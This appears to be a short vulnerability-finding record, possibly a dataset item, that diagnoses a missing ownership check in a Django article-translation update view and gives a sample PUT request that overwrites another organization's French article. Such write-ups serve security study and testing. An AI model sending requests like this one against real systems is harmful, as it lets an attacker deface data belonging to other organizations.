diagnosis: ArticleTranslationUpdateView updates localized article content for fields registered with django-modeltranslation. The view fetches the article using KnowledgeBaseArticle.objects.filter(id=article_id) without checking that request.user is the author or belongs to the owning organization. An attacker can tamper with and deface localized articles owned by other organizations.
exploit_request:
PUT /api/articles/128/translation/ HTTP/1.1
Host: kb.cloudsupport.io
Authorization: Bearer 66a5b4c3...
Content-Type: application/json

{"language": "fr", "content": "Tampered French article body"}
